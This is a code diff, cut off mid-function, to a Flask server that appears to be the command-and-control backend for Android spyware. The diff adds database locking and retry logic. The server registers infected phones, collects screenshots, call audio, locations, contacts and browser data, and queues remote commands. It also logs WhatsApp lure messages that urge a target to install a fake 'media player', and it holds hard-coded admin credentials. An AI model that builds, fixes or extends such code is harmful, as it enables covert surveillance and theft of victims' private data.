@@ -5,6 +5,8 @@ import os
 import random
 import io
 import json
+import time
+from threading import Lock
 
 app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY', 'mp_agent_platform_2024')
@@ -14,134 +16,159 @@ app.template_folder = 'templates'
 ADMIN_USERNAME = "Mpc"
 ADMIN_PASSWORD = "0220Mpc"
 
+# Database lock to prevent concurrent access
+db_lock = Lock()
+
 # Initialize database with migration support
 def init_database():
-    conn = sqlite3.connect('mp_agent.db')
-    cursor = conn.cursor()
-    
-    # Check if agents table exists and get its columns
-    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='agents'")
-    table_exists = cursor.fetchone()
-    
-    if table_exists:
-        # Get current columns
-        cursor.execute("PRAGMA table_info(agents)")
-        existing_columns = [column[1] for column in cursor.fetchall()]
+    with db_lock:
+        conn = sqlite3.connect('mp_agent.db')
+        cursor = conn.cursor()
         
-        # Add missing columns
-        if 'user_agent' not in existing_columns:
-            cursor.execute("ALTER TABLE agents ADD COLUMN user_agent TEXT")
-            print("✅ Added user_agent column to agents table")
+        # Check if agents table exists and get its columns
+        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='agents'")
+        table_exists = cursor.fetchone()
         
-        if 'browser_info' not in existing_columns:
-            cursor.execute("ALTER TABLE agents ADD COLUMN browser_info TEXT")
-            print("✅ Added browser_info column to agents table")
-    else:
-        # Create fresh agents table
+        if table_exists:
+            # Get current columns
+            cursor.execute("PRAGMA table_info(agents)")
+            existing_columns = [column[1] for column in cursor.fetchall()]
+            
+            # Add missing columns
+            if 'user_agent' not in existing_columns:
+                cursor.execute("ALTER TABLE agents ADD COLUMN user_agent TEXT")
+                print("✅ Added user_agent column to agents table")
+            
+            if 'browser_info' not in existing_columns:
+                cursor.execute("ALTER TABLE agents ADD COLUMN browser_info TEXT")
+                print("✅ Added browser_info column to agents table")
+        else:
+            # Create fresh agents table
+            cursor.execute('''
+                CREATE TABLE agents (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    agent_id TEXT UNIQUE NOT NULL,
+                    phone_model TEXT,
+                    android_version TEXT,
+                    ip_address TEXT,
+                    status TEXT DEFAULT 'active',
+                    first_seen DATETIME,
+                    last_seen DATETIME,
+                    screenshot_count INTEGER DEFAULT 0,
+                    call_records INTEGER DEFAULT 0,
+                    location_data TEXT,
+                    battery_level INTEGER,
+                    last_screenshot DATETIME,
+                    user_agent TEXT,
+                    browser_info TEXT
+                )
+            ''')
+            print("✅ Created fresh agents table")
+        
+        # Create other tables if they don't exist
         cursor.execute('''
-            CREATE TABLE agents (
+            CREATE TABLE IF NOT EXISTS screenshots (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
-                agent_id TEXT UNIQUE NOT NULL,
-                phone_model TEXT,
-                android_version TEXT,
-                ip_address TEXT,
-                status TEXT DEFAULT 'active',
-                first_seen DATETIME,
-                last_seen DATETIME,
-                screenshot_count INTEGER DEFAULT 0,
-                call_records INTEGER DEFAULT 0,
-                location_data TEXT,
-                battery_level INTEGER,
-                last_screenshot DATETIME,
-                user_agent TEXT,
-                browser_info TEXT
+                agent_id TEXT,
+                screenshot_data BLOB,
+                timestamp DATETIME,
+                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
             )
         ''')
-        print("✅ Created fresh agents table")
-    
-    # Create other tables if they don't exist
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS screenshots (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            agent_id TEXT,
-            screenshot_data BLOB,
-            timestamp DATETIME,
-            FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
-        )
-    ''')
-    
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS call_records (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            agent_id TEXT,
-            call_type TEXT,
-            phone_number TEXT,
-            duration INTEGER,
-            audio_data BLOB,
-            timestamp DATETIME,
-            FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
-        )
-    ''')
-    
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS deployments (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            target_phone TEXT,
-            agent_id TEXT,
-            message_sent TEXT,
-            status TEXT,
-            timestamp DATETIME
-        )
-    ''')
-    
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS system_logs (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            level TEXT,
-            message TEXT,
-            timestamp DATETIME
-        )
-    ''')
-    
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS commands (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            agent_id TEXT,
-            command TEXT,
-            status TEXT DEFAULT 'pending',
-            result TEXT,
-            timestamp DATETIME
-        )
-    ''')
-    
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS browser_data (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            agent_id TEXT,
-            data_type TEXT,
-            data_content TEXT,
-            timestamp DATETIME,
-            FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
-        )
-    ''')
-    
-    conn.commit()
-    conn.close()
-    print("✅ Database initialization completed")
+        
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS call_records (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                agent_id TEXT,
+                call_type TEXT,
+                phone_number TEXT,
+                duration INTEGER,
+                audio_data BLOB,
+                timestamp DATETIME,
+                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
+            )
+        ''')
+        
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS deployments (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                target_phone TEXT,
+                agent_id TEXT,
+                message_sent TEXT,
+                status TEXT,
+                timestamp DATETIME
+            )
+        ''')
+        
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS system_logs (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                level TEXT,
+                message TEXT,
+                timestamp DATETIME
+            )
+        ''')
+        
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS commands (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                agent_id TEXT,
+                command TEXT,
+                status TEXT DEFAULT 'pending',
+                result TEXT,
+                timestamp DATETIME
+            )
+        ''')
+        
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS browser_data (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                agent_id TEXT,
+                data_type TEXT,
+                data_content TEXT,
+                timestamp DATETIME,
+                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
+            )
+        ''')
+        
+        conn.commit()
+        conn.close()
+        print("✅ Database initialization completed")
 
 def get_db_connection():
-    conn = sqlite3.connect('mp_agent.db')
-    conn.row_factory = sqlite3.Row
-    return conn
+    """Get database connection with retry logic"""
+    max_retries = 3
+    for attempt in range(max_retries):
+        try:
+            conn = sqlite3.connect('mp_agent.db', timeout=30)
+            conn.row_factory = sqlite3.Row
+            return conn
+        except sqlite3.OperationalError as e:
+            if "locked" in str(e) and attempt < max_retries - 1:
+                time.sleep(0.1)
+                continue
+            raise e
 
 def log_event(level, message):
-    conn = get_db_connection()
-    conn.execute(
-        'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
-        (level, message, datetime.now())
-    )
-    conn.commit()
-    conn.close()
+    """Log event with database lock protection"""
+    with db_lock:
+        max_retries = 3
+        for attempt in range(max_retries):
+            try:
+                conn = get_db_connection()
+                conn.execute(
+                    'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
+                    (level, message, datetime.now())
+                )
+                conn.commit()
+                conn.close()
+                break
+            except sqlite3.OperationalError as e:
+                if "locked" in str(e) and attempt < max_retries - 1:
+                    time.sleep(0.1)
+                    continue
+                print(f"❌ Failed to log event after {max_retries} attempts: {e}")
+                break
 
 # Initialize database on startup
 init_database()
@@ -153,9 +180,10 @@ def debug_agents():
     if not session.get('authenticated'):
         return redirect('/login')
     
-    conn = get_db_connection()
-    agents = conn.execute("SELECT * FROM agents").fetchall()
-    conn.close()
+    with db_lock:
+        conn = get_db_connection()
+        agents = conn.execute("SELECT * FROM agents").fetchall()
+        conn.close()
     
     result = "<h1>All Agents in Database</h1>"
     for agent in agents:
@@ -184,10 +212,11 @@ def reset_agents():
     if not session.get('authenticated'):
         return redirect('/login')
     
-    conn = get_db_connection()
-    conn.execute("DELETE FROM agents")
-    conn.commit()
-    conn.close()
+    with db_lock:
+        conn = get_db_connection()
+        conn.execute("DELETE FROM agents")
+        conn.commit()
+        conn.close()
     
     return "All agents cleared. <a href='/debug/agents'>Check agents</a>"
 
@@ -219,28 +248,29 @@ def dashboard():
     if not session.get('authenticated'):
         return redirect('/login')
     
-    conn = get_db_connection()
-    
-    # Get statistics
-    stats = {
-        'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
-        'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
-        'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
-        'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
-    }
-    
-    # Get recent data - Convert rows to dictionaries
-    all_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()]
-    active_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20").fetchall()]
-    screenshots = [row_to_dict(row) for row in conn.execute('''
-        SELECT s.*, a.phone_model FROM screenshots s 
-        JOIN agents a ON s.agent_id = a.agent_id 
-        ORDER BY s.timestamp DESC LIMIT 16
-    ''').fetchall()]
-    calls = [row_to_dict(row) for row in conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15").fetchall()]
-    deployments = [row_to_dict(row) for row in conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15").fetchall()]
-    
-    conn.close()
+    with db_lock:
+        conn = get_db_connection()
+        
+        # Get statistics
+        stats = {
+            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
+            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
+            'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
+            'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
+        }
+        
+        # Get recent data - Convert rows to dictionaries
+        all_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()]
+        active_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20").fetchall()]
+        screenshots = [row_to_dict(row) for row in conn.execute('''
+            SELECT s.*, a.phone_model FROM screenshots s 
+            JOIN agents a ON s.agent_id = a.agent_id 
+            ORDER BY s.timestamp DESC LIMIT 16
+        ''').fetchall()]
+        calls = [row_to_dict(row) for row in conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15").fetchall()]
+        deployments = [row_to_dict(row) for row in conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15").fetchall()]
+        
+        conn.close()
     
     platform_url = request.host_url.rstrip('/')
     
@@ -258,31 +288,32 @@ def admin_dashboard():
     if not session.get('authenticated'):
         return redirect('/login')
     
-    conn = get_db_connection()
-    
-    # Get comprehensive statistics
-    stats = {
-        'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
-        'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
-        'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
-        'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0],
-        'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
-    }
-    
-    # Get recent data - Convert rows to dictionaries
-    all_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()]
-    active_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20").fetchall()]
-    screenshots = [row_to_dict(row) for row in conn.execute('''
-        SELECT s.*, a.phone_model FROM screenshots s 
-        JOIN agents a ON s.agent_id = a.agent_id 
-        ORDER BY s.timestamp DESC LIMIT 16
-    ''').fetchall()]
-    calls = [row_to_dict(row) for row in conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15").fetchall()]
-    deployments = [row_to_dict(row) for row in conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15").fetchall()]
-    commands = [row_to_dict(row) for row in conn.execute("SELECT * FROM commands ORDER BY timestamp DESC LIMIT 10").fetchall()]
-    logs = [row_to_dict(row) for row in conn.execute("SELECT * FROM system_logs ORDER BY timestamp DESC LIMIT 20").fetchall()]
-    
-    conn.close()
+    with db_lock:
+        conn = get_db_connection()
+        
+        # Get comprehensive statistics
+        stats = {
+            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
+            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
+            'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
+            'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0],
+            'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
+        }
+        
+        # Get recent data - Convert rows to dictionaries
+        all_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()]
+        active_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20").fetchall()]
+        screenshots = [row_to_dict(row) for row in conn.execute('''
+            SELECT s.*, a.phone_model FROM screenshots s 
+            JOIN agents a ON s.agent_id = a.agent_id 
+            ORDER BY s.timestamp DESC LIMIT 16
+        ''').fetchall()]
+        calls = [row_to_dict(row) for row in conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15").fetchall()]
+        deployments = [row_to_dict(row) for row in conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15").fetchall()]
+        commands = [row_to_dict(row) for row in conn.execute("SELECT * FROM commands ORDER BY timestamp DESC LIMIT 10").fetchall()]
+        logs = [row_to_dict(row) for row in conn.execute("SELECT * FROM system_logs ORDER BY timestamp DESC LIMIT 20").fetchall()]
+        
+        conn.close()
     
     platform_url = request.host_url.rstrip('/')
     
@@ -393,62 +424,63 @@ def register_agent():
         if not agent_id:
             return jsonify({'status': 'error', 'message': 'Agent ID is required'}), 400
         
-        conn = get_db_connection()
-        
-        # Check if agent exists
-        existing_agent = conn.execute(
-            "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
-        ).fetchone()
-        
-        current_time = datetime.now()
-        
-        if existing_agent:
-            print(f"🔄 Updating existing agent: {agent_id}")
-            # Update with all available fields
-            try:
-                conn.execute('''
-                    UPDATE agents SET 
-                    phone_model = ?, android_version = ?, ip_address = ?, user_agent = ?,
-                    status = 'active', last_seen = ?
-                    WHERE agent_id = ?
-                ''', (phone_model, android_version, ip_address, user_agent, current_time, agent_id))
-            except sqlite3.OperationalError as e:
-                print(f"⚠️ Schema update needed: {e}")
-                # Fallback for old schema
-                conn.execute('''
-                    UPDATE agents SET 
-                    phone_model = ?, android_version = ?, ip_address = ?,
-                    status = 'active', last_seen = ?
-                    WHERE agent_id = ?
-                ''', (phone_model, android_version, ip_address, current_time, agent_id))
-            action = "updated"
-        else:
-            print(f"🆕 Registering new agent: {agent_id}")
-            # Insert with all available fields
-            try:
-                conn.execute('''
-                    INSERT INTO agents 
-                    (agent_id, phone_model, android_version, ip_address, user_agent, status, first_seen, last_seen)
-                    VALUES (?, ?, ?, ?, ?, 'active', ?, ?)
-                ''', (agent_id, phone_model, android_version, ip_address, user_agent, current_time, current_time))
-            except sqlite3.OperationalError as e:
-                print(f"⚠️ Schema insert needed: {e}")
-                # Fallback for old schema
-                conn.execute('''
-                    INSERT INTO agents 
-                    (agent_id, phone_model, android_version, ip_address, status, first_seen, last_seen)
-                    VALUES (?, ?, ?, ?, 'active', ?, ?)
-                ''', (agent_id, phone_model, android_version, ip_address, current_time, current_time))
-            action = "registered"
-        
-        conn.commit()
-        
-        # Check for pending commands
-        pending_commands = conn.execute(
-            "SELECT id, command FROM commands WHERE agent_id = ? AND status = 'pending'", 
-            (agent_id,)
-        ).fetchall()
-        conn.close()
+        with db_lock:
+            conn = get_db_connection()
+            
+            # Check if agent exists
+            existing_agent = conn.execute(
+                "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
+            ).fetchone()
+            
+            current_time = datetime.now()
+            
+            if existing_agent:
+                print(f"🔄 Updating existing agent: {agent_id}")
+                # Update with all available fields
+                try:
+                    conn.execute('''
+                        UPDATE agents SET 
+                        phone_model = ?, android_version = ?, ip_address = ?, user_agent = ?,
+                        status = 'active', last_seen = ?
+                        WHERE agent_id = ?
+                    ''', (phone_model, android_version, ip_address, user_agent, current_time, agent_id))
+                except sqlite3.OperationalError as e:
+                    print(f"⚠️ Schema update needed: {e}")
+                    # Fallback for old schema
+                    conn.execute('''
+                        UPDATE agents SET 
+                        phone_model = ?, android_version = ?, ip_address = ?,
+                        status = 'active', last_seen = ?
+                        WHERE agent_id = ?
+                    ''', (phone_model, android_version, ip_address, current_time, agent_id))
+                action = "updated"
+            else:
+                print(f"🆕 Registering new agent: {agent_id}")
+                # Insert with all available fields
+                try:
+                    conn.execute('''
+                        INSERT INTO agents 
+                        (agent_id, phone_model, android_version, ip_address, user_agent, status, first_seen, last_seen)
+                        VALUES (?, ?, ?, ?, ?, 'active', ?, ?)
+                    ''', (agent_id, phone_model, android_version, ip_address, user_agent, current_time, current_time))
+                except sqlite3.OperationalError as e:
+                    print(f"⚠️ Schema insert needed: {e}")
+                    # Fallback for old schema
+                    conn.execute('''
+                        INSERT INTO agents 
+                        (agent_id, phone_model, android_version, ip_address, status, first_seen, last_seen)
+                        VALUES (?, ?, ?, ?, 'active', ?, ?)
+                    ''', (agent_id, phone_model, android_version, ip_address, current_time, current_time))
+                action = "registered"
+            
+            conn.commit()
+            
+            # Check for pending commands
+            pending_commands = conn.execute(
+                "SELECT id, command FROM commands WHERE agent_id = ? AND status = 'pending'", 
+                (agent_id,)
+            ).fetchall()
+            conn.close()
         
         log_event('INFO', f'Agent {action}: {agent_id} from {ip_address}')
         print(f"✅ Agent {action} successfully: {agent_id}")
@@ -463,13 +495,12 @@ def register_agent():
         
     except Exception as e:
         error_msg = f'Agent registration failed: {str(e)}'
-        log_event('ERROR', error_msg)
         print(f"❌ {error_msg}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/agent/submit_report', methods=['POST'])
 def submit_report():
-    """Receive general reports from agents - CRITICAL MISSING ENDPOINT"""
+    """Receive general reports from agents - FIXED DATABASE LOCKING"""
     try:
         data = request.get_json()
         if not data:
@@ -484,65 +515,64 @@ def submit_report():
         if not agent_id:
             return jsonify({'status': 'error', 'message': 'Agent ID is required'}), 400
         
-        conn = get_db_connection()
-        current_time = datetime.now()
+        with db_lock:
+            conn = get_db_connection()
+            current_time = datetime.now()
+            
+            # Handle different report types
+            if report_type == 'screenshot':
+                # Update agent last screenshot
+                conn.execute(
+                    'UPDATE agents SET last_seen = ?, last_screenshot = ?, screenshot_count = screenshot_count + 1, status = "active" WHERE agent_id = ?',
+                    (current_time, current_time, agent_id)
+                )
+                print(f"✅ Screenshot report processed for {agent_id}")
+                
+            elif report_type == 'location':
+                # Store location data
+                location_json = json.dumps(report_data) if report_data else '{}'
+                conn.execute(
+                    'UPDATE agents SET last_seen = ?, location_data = ?, status = "active" WHERE agent_id = ?',
+                    (current_time, location_json, agent_id)
+                )
+                print(f"📍 Location report processed for {agent_id}")
+                
+            elif report_type == 'device_info':
+                # Update device information
+                battery = report_data.get('battery', 0) if report_data else 0
+                conn.execute(
+                    'UPDATE agents SET last_seen = ?, battery_level = ?, status = "active" WHERE agent_id = ?',
+                    (current_time, battery, agent_id)
+                )
+                print(f"📱 Device info processed for {agent_id}")
+                
+            elif report_type == 'heartbeat':
+                # Simple heartbeat - keep agent active
+                conn.execute(
+                    'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
+                    (current_time, agent_id)
+                )
+                print(f"💓 Heartbeat from {agent_id}")
+                
+            elif report_type == 'contacts':
+                # Store contacts count
+                contacts_count = report_data.get('count', 0) if report_data else 0
+                conn.execute(
+                    'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
+                    (current_time, agent_id)
+                )
+                print(f"👥 Contacts report from {agent_id}: {contacts_count} contacts")
+            
+            conn.commit()
+            conn.close()
         
-        # Handle different report types
-        if report_type == 'screenshot':
-            # Update agent last screenshot
-            conn.execute(
-                'UPDATE agents SET last_seen = ?, last_screenshot = ?, screenshot_count = screenshot_count + 1, status = "active" WHERE agent_id = ?',
-                (current_time, current_time, agent_id)
-            )
-            log_event('INFO', f'Screenshot report from {agent_id}')
-            print(f"✅ Screenshot report processed for {agent_id}")
-            
-        elif report_type == 'location':
-            # Store location data
-            location_json = json.dumps(report_data) if report_data else '{}'
-            conn.execute(
-                'UPDATE agents SET last_seen = ?, location_data = ?, status = "active" WHERE agent_id = ?',
-                (current_time, location_json, agent_id)
-            )
-            log_event('INFO', f'Location report from {agent_id}')
-            print(f"📍 Location report processed for {agent_id}")
-            
-        elif report_type == 'device_info':
-            # Update device information
-            battery = report_data.get('battery', 0) if report_data else 0
-            conn.execute(
-                'UPDATE agents SET last_seen = ?, battery_level = ?, status = "active" WHERE agent_id = ?',
-                (current_time, battery, agent_id)
-            )
-            log_event('INFO', f'Device info from {agent_id}')
-            print(f"📱 Device info processed for {agent_id}")
-            
-        elif report_type == 'heartbeat':
-            # Simple heartbeat - keep agent active
-            conn.execute(
-                'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
-                (current_time, agent_id)
-            )
-            print(f"💓 Heartbeat from {agent_id}")
-            
-        elif report_type == 'contacts':
-            # Store contacts count
-            contacts_count = report_data.get('count', 0) if report_data else 0
-            conn.execute(
-                'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
-                (current_time, agent_id)
-            )
-            log_event('INFO', f'Contacts report from {agent_id}: {contacts_count} contacts')
-            print(f"👥 Contacts report from {agent_id}: {contacts_count} contacts")
-        
-        conn.commit()
-        conn.close()
+        # Log event outside the main database lock to prevent deadlocks
+        log_event('INFO', f'Report from {agent_id}: {report_type}')
         
         return jsonify({'status': 'success', 'message': 'Report received successfully'})
         
     except Exception as e:
         error_msg = f'Report submission failed: {str(e)}'
-        log_event('ERROR', error_msg)
         print(f"❌ {error_msg}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
@@ -558,18 +588,19 @@ def upload_screenshot():
         
         screenshot_data = screenshot_file.read()
         
-        conn = get_db_connection()
-        conn.execute(
-            'INSERT INTO screenshots (agent_id, screenshot_data, timestamp) VALUES (?, ?, ?)',
-            (agent_id, screenshot_data, datetime.now())
-        )
-        # Ensure agent status remains active
-        conn.execute(
-            'UPDATE agents SET screenshot_count = screenshot_count + 1, last_seen = ?, last_screenshot = ?, status = "active" WHERE agent_id = ?',
-            (datetime.now(), datetime.now(), agent_id)
-        )
-        conn.commit()
-        conn.close()
+        with db_lock:
+            conn = get_db_connection()
+            conn.execute(
+                'INSERT INTO screenshots (agent_id, screenshot_data, timestamp) VALUES (?, ?, ?)',
+                (agent_id, screenshot_data, datetime.now())
+            )
+            # Ensure agent status remains active
+            conn.execute(
+                'UPDATE agents SET screenshot_count = screenshot_count + 1, last_seen = ?, last_screenshot = ?, status = "active" WHERE agent_id = ?',
+                (datetime.now(), datetime.now(), agent_id)
+            )
+            conn.commit()
+            conn.close()
         
         log_event('INFO', f'Screenshot uploaded from {agent_id}')
         return jsonify({'status': 'success', 'message': 'Screenshot uploaded successfully'})
@@ -590,18 +621,19 @@ def upload_call():
         
         audio_data = audio_file.read() if audio_file else None
         
-        conn = get_db_connection()
-        conn.execute('''
-            INSERT INTO call_records (agent_id, call_type, phone_number, duration, audio_data, timestamp)
-            VALUES (?, ?, ?, ?, ?, ?)
-        ''', (agent_id, call_type, phone_number, duration, audio_data, datetime.now()))
-        # Ensure agent status remains active
-        conn.execute(
-            'UPDATE agents SET call_records = call_records + 1, last_seen = ?, status = "active" WHERE agent_id = ?',
-            (datetime.now(), agent_id)
-        )
-        conn.commit()
-        conn.close()
+        with db_lock:
+            conn = get_db_connection()
+            conn.execute('''
+                INSERT INTO call_records (agent_id, call_type, phone_number, duration, audio_data, timestamp)
+                VALUES (?, ?, ?, ?, ?, ?)
+            ''', (agent_id, call_type, phone_number, duration, audio_data, datetime.now()))
+            # Ensure agent status remains active
+            conn.execute(
+                'UPDATE agents SET call_records = call_records + 1, last_seen = ?, status = "active" WHERE agent_id = ?',
+                (datetime.now(), agent_id)
+            )
+            conn.commit()
+            conn.close()
         
         log_event('INFO', f'Call recording from {agent_id}: {call_type} call to {phone_number}')
         return jsonify({'status': 'success', 'message': 'Call recording uploaded successfully'})
@@ -619,14 +651,15 @@ def update_agent_status():
         battery_level = data.get('battery_level')
         location = data.get('location')
         
-        conn = get_db_connection()
-        # Ensure agent status remains active
-        conn.execute(
-            'UPDATE agents SET last_seen = ?, battery_level = ?, location_data = ?, status = "active" WHERE agent_id = ?',
-            (datetime.now(), battery_level, location, agent_id)
-        )
-        conn.commit()
-        conn.close()
+        with db_lock:
+            conn = get_db_connection()
+            # Ensure agent status remains active
+            conn.execute(
+                'UPDATE agents SET last_seen = ?, battery_level = ?, location_data = ?, status = "active" WHERE agent_id = ?',
+                (datetime.now(), battery_level, location, agent_id)
+            )
+            conn.commit()
+            conn.close()
         
         return jsonify({'status': 'success', 'message': 'Status updated'})
         
@@ -642,20 +675,21 @@ def receive_web_data():
         data_type = data.get('data_type')
         data_content = data.get('data_content')
         
-        conn = get_db_connection()
-        conn.execute(
-            'INSERT INTO browser_data (agent_id, data_type, data_content, timestamp) VALUES (?, ?, ?, ?)',
-            (agent_id, data_type, data_content, datetime.now())
-        )
-        
-        # Update agent last seen
-        conn.execute(
-            'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
-            (datetime.now(), agent_id)
-        )
-        
-        conn.commit()
-        conn.close()
+        with db_lock:
+            conn = get_db_connection()
+            conn.execute(
+                'INSERT INTO browser_data (agent_id, data_type, data_content, timestamp) VALUES (?, ?, ?, ?)',
+                (agent_id, data_type, data_content, datetime.now())
+            )
+            
+            # Update agent last seen
+            conn.execute(
+                'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
+                (datetime.now(), agent_id)
+            )
+            
+            conn.commit()
+            conn.close()
         
         log_event('INFO', f'Web data received from {agent_id}: {data_type}')
         return jsonify({'status': 'success'})
@@ -670,11 +704,12 @@ def serve_screenshot(screenshot_id):
     if not session.get('authenticated'):
         return redirect('/login')
     
-    conn = get_db_connection()
-    screenshot = conn.execute(
-        "SELECT screenshot_data FROM screenshots WHERE id = ?", (screenshot_id,)
-    ).fetchone()
-    conn.close()
+    with db_lock:
+        conn = get_db_connection()
+        screenshot = conn.execute(
+            "SELECT screenshot_data FROM screenshots WHERE id = ?", (screenshot_id,)
+        ).fetchone()
+        conn.close()
     
     if screenshot and screenshot['screenshot_data']:
         return Response(screenshot['screenshot_data'], mimetype='image/jpeg')
@@ -685,11 +720,12 @@ def serve_call_audio(call_id):
     if not session.get('authenticated'):
         return redirect('/login')
     
-    conn = get_db_connection()
-    call = conn.execute(
-        "SELECT audio_data FROM call_records WHERE id = ?", (call_id,)
-    ).fetchone()
-    conn.close()
+    with db_lock:
+        conn = get_db_connection()
+        call = conn.execute(
+            "SELECT audio_data FROM call_records WHERE id = ?", (call_id,)
+        ).fetchone()
+        conn.close()
     
     if call and call['audio_data']:
         return Response(call['audio_data'], mimetype='audio/mp4')
@@ -723,13 +759,14 @@ For enhanced quality, install the media player:
 
 Enjoy! 😊'''
     
-    conn = get_db_connection()
-    conn.execute(
-        'INSERT INTO deployments (target_phone, agent_id, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
-        (target_phone, agent_id, whatsapp_message, 'initiated', datetime.now())
-    )
-    conn.commit()
-    conn.close()
+    with db_lock:
+        conn = get_db_connection()
+        conn.execute(
+            'INSERT INTO deployments (target_phone, agent_id, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
+            (target_phone, agent_id, whatsapp_message, 'initiated', datetime.now())
+        )
+        conn.commit()
+        conn.close()
     
     log_event('INFO', f'Deployment created for {target_phone} -> {agent_id}')
     
@@ -754,13 +791,14 @@ def send_command():
     if not agent_id or not command:
         return "Missing agent_id or command", 400
     
-    conn = get_db_connection()
-    conn.execute(
-        'INSERT INTO commands (agent_id, command, timestamp) VALUES (?, ?, ?)',
-        (agent_id, command, datetime.now())
-    )
-    conn.commit()
-    conn.close()
+    with db_lock:
+        conn = get_db_connection()
+        conn.execute(
+            'INSERT INTO commands (agent_id, command, timestamp) VALUES (?, ?, ?)',
+            (agent_id, command, datetime.now())
+        )
+        conn.commit()
+        conn.close()
     
     log_event('INFO', f'Command sent to {agent_id}: {command}')
     return redirect('/admin')
@@ -768,12 +806,13 @@ def send_command():
 @app.route('/api/agent/check_commands/<agent_id>')
 def check_commands(agent_id):
     """Agents check for pending commands"""
-    conn = get_db_connection()
-    commands = conn.execute(
-        "SELECT id, command FROM commands WHERE agent_id = ? AND status = 'pending'", 
-        (agent_id,)
-    ).fetchall()
-    conn.close()
+    with db_lock:
+        conn = get_db_connection()
+        commands = conn.execute(
